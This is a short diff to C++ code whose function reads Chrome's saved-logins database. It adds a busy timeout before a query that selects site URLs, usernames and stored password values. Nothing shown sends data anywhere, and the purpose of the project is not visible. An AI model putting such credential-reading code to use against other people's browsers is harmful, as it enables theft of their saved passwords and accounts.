@@ -66,6 +66,8 @@ std::expected<std::vector<login>, browser_error> chrome::get_logins(void) {
         return std::unexpected(browser_error::sqlite_error);
     }
 
+    sqlite3_busy_timeout(db.get(), 1000);
+
     unique_sqlite3_stmt stmt;
     if (sqlite3_prepare_v2(db.get(),
                            "SELECT origin_url, date_created, date_last_used, date_password_modified, username_value, password_value FROM logins",
